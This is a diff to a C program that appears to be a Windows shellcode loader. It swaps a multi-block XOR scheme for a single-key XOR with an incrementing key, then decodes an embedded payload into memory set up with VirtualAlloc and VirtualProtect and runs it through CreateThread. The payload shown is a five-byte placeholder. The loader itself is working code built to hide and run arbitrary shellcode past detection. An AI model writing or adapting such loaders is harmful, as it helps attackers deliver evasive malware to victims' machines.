@@ -9,6 +9,7 @@ Compile:
 
 Technique:
     - allocation: VirtualAlloc
+    - writing:    XOR single key with CTR
     - permission: VirtualProtect
     - execution:  CreateThread
 */
@@ -19,26 +20,10 @@ Technique:
 
 /*
     Encoded shellcode format:
-        [N] [B]
-        [[Key-1] [Encoded Shellcode-1]] 
-        [[Key-2] [Encoded Shellcode-2]]
-        ...
-        [[Key-N] [Encoded Shellcode-N]]
+        [KEY] [ENCODED SHELLCODE]
 
-    Each block will preceeded by a single-byte key.
+    KEY is a byte which will be used to xor against the remaining bytes.
 */
-
-/*
-    buffer: encoded shellcode
-*/
-size_t calculate (uint8_t * buffer)
-{
-    uint8_t nblock = buffer[0];
-    uint8_t stride = buffer[1];
-
-    // max size
-    return nblock * stride; 
-}
 
 /*
     dst: buffer which will receive the decoded shellcode
@@ -47,28 +32,13 @@ size_t calculate (uint8_t * buffer)
 */
 void transform (uint8_t * dst, uint8_t * src, size_t size)
 {
-    // getting N and S
-    uint8_t nblock = src[0];
-    uint8_t stride = src[1];
-    uint8_t key;
+    size_t idx;
+    uint8_t key = src[0];
 
-    uint8_t idx_n, idx_s;    
-    size_t  idx_dst = 0;
-
-    // skipping N and S.
-    uint8_t * ptr_src = &src[2];
-    
-    for (idx_n = 0; idx_n < nblock; idx_n++)
+    for (idx = 1; idx < size; idx++)
     {
-        key = ptr_src[0];
-
-        for (idx_s = 1; idx_s <= stride; idx_s++)
-        {
-            dst[idx_dst] = ptr_src[idx_s] ^ key;
-            idx_dst++;
-        }
-        // ptr_src point to next block
-        ptr_src = ptr_src + stride + 1;
+        dst[idx - 1] = src[idx] ^ key;
+        key++;
     }
 }
 
@@ -80,11 +50,11 @@ int main ()
     DWORD   old_protect = 0;
 
     // shellcode storage in stackz
-    uint8_t payload []  = { 0x01,0x05,0xf3,0x63,0x63,0x3f,0x30,0x63 };
-    size_t  payload_len = calculate(payload);
+    uint8_t     payload []  = { 0xcc,0x5c,0x5d,0x02,0x0c };
+    uint32_t    payload_len = 5;
 
     // allocate memory buffer for payload as READ-WRITE (no executable)
-    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    runtime = VirtualAlloc (0, payload_len - 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     // decode payload and store to allocated buffer
     transform ((uint8_t*)runtime, payload, payload_len);
@@ -97,6 +67,8 @@ int main ()
         th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
         WaitForSingleObject (th_shellcode, -1);
     }
+
+    VirtualFree (runtime, payload_len, MEM_RELEASE);
 
     return 0;
 }
